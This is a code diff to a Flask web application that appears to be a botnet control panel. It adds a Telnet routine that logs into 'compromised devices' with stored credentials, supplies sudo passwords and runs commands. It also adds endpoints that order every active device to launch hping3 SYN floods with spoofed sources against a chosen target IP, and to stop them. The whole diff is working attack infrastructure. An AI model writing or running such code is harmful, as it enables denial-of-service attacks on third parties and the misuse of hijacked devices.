@@ -12,6 +12,8 @@ from datetime import datetime
 import logging
 from werkzeug.serving import make_server
 import json
+import telnetlib
+import subprocess
 
 app = Flask(__name__)
 
@@ -142,6 +144,53 @@ class DatabaseManager:
             conn.commit()
             conn.close()
             return attack_id
+
+    def execute_telnet_command(self, ip, username, password, command):
+        """Establish Telnet connection and execute command, handling sudo password."""
+        try:
+            tn = telnetlib.Telnet(ip, 23, timeout=10)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(username.encode() + b"\n")
+            tn.read_until(b"Password: ", timeout=5)
+            if password:
+                tn.write(password.encode() + b"\n")
+            else:
+                tn.write(b"\n")
+            
+            # Wait for shell prompt or command completion indicator
+            # This part might need adjustment based on actual device prompts
+            tn.read_until(b"$", timeout=5) # Attempt to read until a common prompt
+            tn.read_until(b"#", timeout=5)
+            tn.read_until(b">", timeout=5)
+            
+            self.log(f"Sending command to {ip} via Telnet: {command}")
+            tn.write((command + "\n").encode())
+            
+            # Handle potential sudo password prompt
+            response = tn.read_until(b"password", timeout=3) # Look for 'password' prompt
+            if b"password" in response.lower():
+                self.log(f"Sudo password prompt detected on {ip}")
+                if password:
+                    tn.write((password + "\n").encode())
+                    self.log(f"Sent sudo password to {ip}")
+                else:
+                    self.log(f"No password available for sudo on {ip}")
+                    # May need to handle this case, command might fail
+            
+            # Give command some time to execute (adjust as needed)
+            time.sleep(2)
+            
+            # Optionally read command output (can be noisy)
+            # output = tn.read_very_lazy()
+            # self.log(f"Output from {ip}: {output.decode()}")
+            
+            self.log(f"Command sent to {ip} successfully")
+            tn.close()
+            return True
+            
+        except Exception as e:
+            self.log(f"Failed to execute Telnet command on {ip}: {e}")
+            return False
 
 # Global variables
 db_manager = DatabaseManager()
@@ -572,6 +621,87 @@ def get_scan_results():
     results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
     conn.close()
     return jsonify(results)
+
+@app.route('/start-telnet-ddos', methods=['POST'])
+def start_telnet_ddos():
+    """Start DDoS attack on all compromised devices via Telnet."""
+    try:
+        data = request.get_json()
+        target_ip = data.get('target')
+        attack_type = data.get('attack_type', 'syn')
+        
+        if not target_ip:
+            return jsonify({'error': 'Target IP required'}), 400
+            
+        # Get all compromised devices from the database
+        conn = db_manager.get_connection()
+        cursor = conn.cursor()
+        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "active"')
+        devices = cursor.fetchall()
+        conn.close()
+        
+        if not devices:
+            return jsonify({'message': 'No active compromised devices found'}), 404
+            
+        success_count = 0
+        
+        # Translate attack type to hping3 command
+        if attack_type == 'syn':
+            hping3_cmd_template = "sudo hping3 -S -p 80 --flood --rand-source {}".format(target_ip)
+        elif attack_type == 'rtsp':
+             hping3_cmd_template = "sudo hping3 -S -p 554 --flood --rand-source {}".format(target_ip)
+        elif attack_type == 'mqtt':
+             hping3_cmd_template = "sudo hping3 -S -p 1883 --flood --rand-source {}".format(target_ip)
+        else:
+            return jsonify({'error': 'Invalid attack type'}), 400
+            
+        for device in devices:
+            ip, username, password = device
+            # Construct the full hping3 command for this device
+            hping3_cmd = hping3_cmd_template
+            
+            if db_manager.execute_telnet_command(ip, username, password, hping3_cmd):
+                success_count += 1
+                
+        return jsonify({
+            'status': 'success',
+            'message': f'Attempted to start {attack_type.upper()} attack on {success_count}/{len(devices)} devices against {target_ip}'
+        })
+        
+    except Exception as e:
+        logging.error(f"Failed to start Telnet DDoS attack: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/stop-telnet-ddos', methods=['POST'])
+def stop_telnet_ddos():
+    """Stop DDoS attack on all compromised devices via Telnet."""
+    try:
+        # Get all compromised devices from the database
+        conn = db_manager.get_connection()
+        cursor = conn.cursor()
+        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "active"')
+        devices = cursor.fetchall()
+        conn.close()
+        
+        if not devices:
+            return jsonify({'message': 'No active compromised devices found'}), 404
+            
+        success_count = 0
+        stop_cmd = "sudo pkill hping3"
+        
+        for device in devices:
+            ip, username, password = device
+            if db_manager.execute_telnet_command(ip, username, password, stop_cmd):
+                success_count += 1
+                
+        return jsonify({
+            'status': 'success',
+            'message': f'Attempted to stop DDoS attack on {success_count}/{len(devices)} devices'
+        })
+        
+    except Exception as e:
+        logging.error(f"Failed to stop Telnet DDoS attack: {e}")
+        return jsonify({'error': str(e)}), 500
 
 def main():
     """Main entry point"""
